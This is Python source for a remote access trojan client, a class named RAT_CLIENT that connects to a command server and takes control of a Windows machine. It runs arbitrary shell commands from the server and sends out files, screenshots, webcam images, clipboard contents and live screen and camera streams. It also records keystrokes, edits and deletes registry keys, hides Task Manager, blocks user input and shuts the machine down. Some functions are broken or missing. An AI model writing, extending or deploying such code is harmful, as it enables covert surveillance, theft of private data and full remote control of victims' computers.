import socket
import subprocess
import os
import platform
import json
import urllib.request
import shutil
import pyautogui
import webbrowser
import ctypes
from ctypes import *
from winreg import *
import psutil
import time
import re
import glob
import random
import cv2
from PIL import Image
from threading import Thread
from pynput.keyboard import Listener, Controller
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume 
import ctypes
from ctypes import wintypes
import logging

logging.basicConfig(level=logging.DEBUG)

# Constants
WM_SYSCOMMAND = 0x0112
SC_MONITORPOWER = 0xF170
HWND_BROADCAST = 0xFFFF
KEY_ALL_ACCESS = 0xF003F
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
DELETE = 0x00010000
HKEY_CURRENT_USER = 0x80000001
HKEY_CLASSES_ROOT = 0x80000000
HKEY_LOCAL_MACHINE = 0x80000002
HKEY_USERS = 0x80000003
HKEY_CURRENT_CONFIG = 0x80000005
HKEY_PERFORMANCE_DATA = 0x80000004

CLSCTX_ALL = 0x17  # COM object creation

# Global Variables
klgr = False
block = False
mousedbl = False
kbrd = False

# Define necessary constants for clipboard operations
CF_TEXT = 1
GMEM_MOVEABLE = 0x0002

# Load the user32 and kernel32 libraries
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

# Define necessary functions from the libraries
user32.OpenClipboard.argtypes = [wintypes.HWND]
user32.OpenClipboard.restype = wintypes.BOOL

user32.EmptyClipboard.argtypes = []
user32.EmptyClipboard.restype = wintypes.BOOL

user32.SetClipboardData.argtypes = [wintypes.UINT, wintypes.HANDLE]
user32.SetClipboardData.restype = wintypes.HANDLE

user32.GetClipboardData.argtypes = [wintypes.UINT]
user32.GetClipboardData.restype = wintypes.HANDLE

user32.CloseClipboard.argtypes = []
user32.CloseClipboard.restype = wintypes.BOOL

kernel32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
kernel32.GlobalAlloc.restype = wintypes.HANDLE

kernel32.GlobalLock.argtypes = [wintypes.HANDLE]
kernel32.GlobalLock.restype = ctypes.c_void_p

kernel32.GlobalUnlock.argtypes = [wintypes.HANDLE]
kernel32.GlobalUnlock.restype = wintypes.BOOL

kernel32.GlobalFree.argtypes = [wintypes.HANDLE]
kernel32.GlobalFree.restype = wintypes.HANDLE

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = None

    def build_connection(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.host, self.port))
        logging.debug("Connected to the server")
        self.send_profile()

    def send_profile(self):
        profile = {
            "name": platform.node(),
            "os": platform.system(),
            "ip": socket.gethostbyname(socket.gethostname())
        }
        profile_str = json.dumps(profile)
        self.s.send(profile_str.encode())
        logging.debug(f"Sent profile: {profile_str}")

    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        self.s.send(output)

    def keylogger(self):
        def on_press(key):
            if klgr:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()

    def disabletaskmgr(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while True:
                if block:
                    hwnd = ctypes.windll.user32.FindWindowW(0, "Task Manager")
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                    time.sleep(0.5)

    def disable_all(self):
        while True:
            ctypes.windll.user32.BlockInput(True)

    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600 * 24 * 11
        while time.time() < t_end and mousedbl:
            mouse.position = (0, 0)

    def disable_keyboard(self):
        print("cant")

    def execute(self):
        while True:
            command = self.s.recv(1024).decode()

            if command == 'shell':
                while True:
                    command = self.s.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    if command.startswith('cd '):
                        try:
                            os.chdir(command[3:])
                            dir = os.getcwd()
                            self.s.send(dir.encode())
                        except FileNotFoundError:
                            self.s.send("No such directory".encode())
                    else:
                        try:
                            output = subprocess.getoutput(command)
                            self.s.send(output.encode())
                        except Exception as e:
                            self.s.send(f"Error executing command: {str(e)}".encode())
                
            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except Exception:
                    self.s.send("Impossible to get screen".encode())
            
            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except Exception:
                    self.s.send("Impossible to get webcam".encode())
            
            elif command == 'tasklist':
                try:
                    output = subprocess.check_output('tasklist', encoding='oem')
                    self.s.send(output.encode())
                except Exception:
                    self.errorsend()

            elif command == 'list':
                pass  # Implement as needed

            elif command == 'geolocate':
                try:
                    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                        data = json.loads(url.read().decode())
                        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                    self.s.send(link.encode())
                except Exception:
                    self.errorsend()
            
            elif command == 'setvalue':
                try:
                    const = self.s.recv(1024).decode()
                    root = self.s.recv(1024).decode()
                    key2 = self.s.recv(1024).decode()
                    value = self.s.recv(1024).decode()
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    else:
                        self.s.send("Invalid registry key".encode())
                        return
                    SetValueEx(key, key2, 0, REG_SZ, str(value))
                    CloseKey(key)
                    self.s.send("Value is set".encode())
                except Exception:
                    self.s.send("Impossible to set value".encode())
            
            elif command == 'delkey':
                try:
                    const = self.s.recv(1024).decode()
                    root = self.s.recv(1024).decode()
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    else:
                        self.s.send("Invalid registry key".encode())
                        return
                    self.s.send("Key is deleted".encode())
                except Exception:
                    self.s.send("Impossible to delete key".encode())
            
            elif command == 'createkey':
                try:
                    const = self.s.recv(1024).decode()
                    root = self.s.recv(1024).decode()
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    else:
                        self.s.send("Invalid registry key".encode())
                        return
                    self.s.send("Key is created".encode())
                except Exception:
                    self.s.send("Impossible to create key".encode())
            
            elif command == 'volumeup':
                try:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    self.s.send("Volume is increased to 100%".encode())
                except Exception:
                    self.s.send("Module is not found".encode())
            
            elif command == 'volumedown':
                try:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    self.s.send("Volume is decreased to 0%".encode())
                except Exception:
                    self.s.send("Module is not found".encode())
            
            elif command == 'listdrives':
                try:
                    drives = [d for d in os.listdir('/dev') if 'sd' in d]
                    self.s.send(', '.join(drives).encode())
                except Exception:
                    self.s.send("No drives found".encode())
            
            elif command == 'listusb':
                try:
                    devices = psutil.disk_partitions()
                    usb_list = [device.device for device in devices if 'usb' in device.device]
                    self.s.send(', '.join(usb_list).encode())
                except Exception:
                    self.s.send("No USB drives found".encode())

            elif command == 'sendfile':
                file_path = self.s.recv(1024).decode()
                try:
                    with open(file_path, 'rb') as f:
                        self.s.sendall(f.read())
                except Exception:
                    self.s.send("File not found".encode())
            
            elif command == 'fileinfo':
                file_path = self.s.recv(1024).decode()
                if os.path.isfile(file_path):
                    file_info = os.stat(file_path)
                    response = f"Size: {file_info.st_size} bytes, Created: {time.ctime(file_info.st_ctime)}, Modified: {time.ctime(file_info.st_mtime)}"
                    self.s.send(response.encode())
                else:
                    self.s.send("File not found".encode())
            
            elif command == 'listdir':
                dir_path = self.s.recv(1024).decode()
                if os.path.isdir(dir_path):
                    files = glob.glob(f"{dir_path}/*")
                    self.s.send(json.dumps(files).encode())
                else:
                    self.s.send("Directory not found".encode())
            
            elif command == 'websearch':
                query = self.s.recv(1024).decode()
                try:
                    webbrowser.open(f"https://www.google.com/search?q={query}")
                    self.s.send(f"Search for '{query}' opened in browser".encode())
                except Exception:
                    self.s.send("Unable to perform search".encode())

            elif command == 'findtext':
                file_path = self.s.recv(1024).decode()
                search_text = self.s.recv(1024).decode()
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                    occurrences = len(re.findall(search_text, content))
                    self.s.send(f"'{search_text}' found {occurrences} times".encode())
                except Exception:
                    self.s.send("File not found or error reading file".encode())

            elif command == 'disable':
                if self.s.recv(1024).decode() == 'mouse':
                    global mousedbl
                    mousedbl = not mousedbl
                    if mousedbl:
                        self.disable_mouse()
                elif self.s.recv(1024).decode() == 'keyboard':
                    global kbrd
                    kbrd = not kbrd
                    if kbrd:
                        self.disable_keyboard()
                elif self.s.recv(1024).decode() == 'block':
                    global block
                    block = not block
                    if block:
                        self.block_task_manager()
                elif self.s.recv(1024).decode() == 'disable_all':
                    self.disable_all()
            
            elif command == 'shutdown':
                self.s.send("Shutting down...".encode())
                os.system("shutdown /s /t 1")
            
            elif command == 'reboot':
                self.s.send("Rebooting...".encode())
                os.system("shutdown /r /t 1")
            
            elif command == 'logout':
                self.s.send("Logging out...".encode())
                os.system("shutdown /l")

            elif command == 'sleep':
                self.s.send("Putting system to sleep...".encode())
                ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
            
            elif command == 'turn_off_display':
                self.s.send("Turning off display...".encode())
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

            elif command == 'recovery_key':
                self.s.send(f"Your recovery key is: {random.randint(100000, 999999)}".encode())
            
            elif command == 'fetch_ips':
                ip_info = ''
                try:
                    ip_info = socket.gethostbyname(socket.gethostname())
                except Exception as e:
                    ip_info = f"Error fetching IP: {e}"
                self.s.send(ip_info.encode())
            
            elif command == 'get_pid':
                pid = self.s.recv(1024).decode()
                try:
                    process = psutil.Process(int(pid))
                    response = f"Process name: {process.name()}, Status: {process.status()}"
                    self.s.send(response.encode())
                except Exception as e:
                    self.s.send(f"Error: {e}".encode())
            
            elif command == 'set_clipboard':
                text = self.s.recv(1024).decode()
                try:
                    user32.OpenClipboard(None)
                    user32.EmptyClipboard()
                    h_global_mem = kernel32.GlobalAlloc(GMEM_MOVEABLE, len(text) + 1)
                    p_global_mem = kernel32.GlobalLock(h_global_mem)
                    ctypes.memmove(p_global_mem, text.encode(), len(text) + 1)
                    kernel32.GlobalUnlock(h_global_mem)
                    user32.SetClipboardData(CF_TEXT, h_global_mem)
                    user32.CloseClipboard()
                    self.s.send("Clipboard set".encode())
                except Exception:
                    self.s.send("Failed to set clipboard".encode())
            
            elif command == 'get_clipboard':
                try:
                    user32.OpenClipboard(None)
                    h_clip_data = user32.GetClipboardData(CF_TEXT)
                    if h_clip_data:
                        p_clip_data = kernel32.GlobalLock(h_clip_data)
                        text = ctypes.c_char_p(p_clip_data).value.decode()
                        kernel32.GlobalUnlock(h_clip_data)
                        self.s.send(text.encode())
                    else:
                        self.s.send("No text in clipboard".encode())
                    user32.CloseClipboard()
                except Exception:
                    self.s.send("Failed to get clipboard".encode())
            
            elif command == 'screenshot':
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
                try:
                    with open("screenshot.png", 'rb') as f:
                        self.s.sendall(f.read())
                except Exception:
                    self.s.send("Failed to capture screenshot".encode())
            
            elif command == 'get_system_info':
                uname = platform.uname()
                system_info = {
                    "system": uname.system,
                    "node": uname.node,
                    "release": uname.release,
                    "version": uname.version,
                    "machine": uname.machine,
                    "processor": uname.processor
                }
                self.s.send(json.dumps(system_info).encode())
            
            elif command == 'get_cpu_usage':
                cpu_usage = psutil.cpu_percent(interval=1)
                self.s.send(f"CPU usage: {cpu_usage}%".encode())
            
            elif command == 'get_memory_usage':
                memory_info = psutil.virtual_memory()
                self.s.send(f"Memory usage: {memory_info.percent}%".encode())
            
            elif command == 'check_process':
                process_name = self.s.recv(1024).decode()
                found = any(proc.name() == process_name for proc in psutil.process_iter())
                self.s.send(f"Process {'found' if found else 'not found'}".encode())
            
            elif command == 'close_process':
                pid = int(self.s.recv(1024).decode())
                try:
                    process = psutil.Process(pid)
                    process.terminate()
                    self.s.send("Process terminated".encode())
                except Exception as e:
                    self.s.send(f"Error terminating process: {e}".encode())
            
            elif command == 'open_file':
                file_path = self.s.recv(1024).decode()
                try:
                    os.startfile(file_path)
                    self.s.send("File opened".encode())
                except Exception:
                    self.s.send("Failed to open file".encode())

            elif command == 'play_audio':
                audio_path = self.s.recv(1024).decode()
                try:
                    import pygame
                    pygame.init()
                    pygame.mixer.music.load(audio_path)
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        pygame.time.Clock().tick(10)
                    self.s.send("Audio playback completed".encode())
                except Exception:
                    self.s.send("Failed to play audio".encode())
            
            elif command == 'screenshot_camera':
                try:
                    cam = cv2.VideoCapture(0)
                    ret, frame = cam.read()
                    if ret:
                        cv2.imwrite('webcam_screenshot.png', frame)
                        with open('webcam_screenshot.png', 'rb') as f:
                            self.s.sendall(f.read())
                    else:
                        self.s.send("Failed to capture webcam screenshot".encode())
                    cam.release()
                except Exception:
                    self.s.send("Failed to capture webcam screenshot".encode())
            
            elif command == 'clear_log':
                try:
                    open('keylogs.txt', 'w').close()
                    self.s.send("Logs cleared".encode())
                except Exception:
                    self.s.send("Failed to clear logs".encode())

    def start(self):
        self.build_connection()
        self.execute()

# Usage
if __name__ == "__main__":
    client = RAT_CLIENT('127.0.0.1', 4444)
    client.start()
